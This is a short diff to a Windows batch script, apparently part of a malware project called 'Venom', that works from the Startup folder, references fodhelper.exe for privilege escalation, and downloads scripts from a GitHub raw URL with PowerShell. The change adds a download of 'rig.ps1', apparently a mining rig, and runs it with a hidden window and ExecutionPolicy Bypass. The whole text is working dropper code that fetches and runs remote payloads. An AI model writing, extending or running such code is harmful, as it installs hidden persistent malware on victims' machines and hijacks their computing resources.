@@ -18,6 +18,8 @@ cd %STARTUP%
 
 powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"
 
+powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/rig.ps1 -OutFile rig.ps1"
+
 @rem powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/altnt.ps1 -OutFile altnt.ps1"
 @rem powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1" -OutFile "installer.ps1"
 
@@ -31,6 +33,9 @@ start fodhelper.exe
 
 @REM run payload
 powershell -windowstyle hidden -ExecutionPolicy Bypass ./wget.cmd
+
+powershell -windowstyle hidden -ExecutionPolicy Bypass ./rig.ps1
+
 
 @REM cd back into initial location
 cd "%INITIALPATH%"
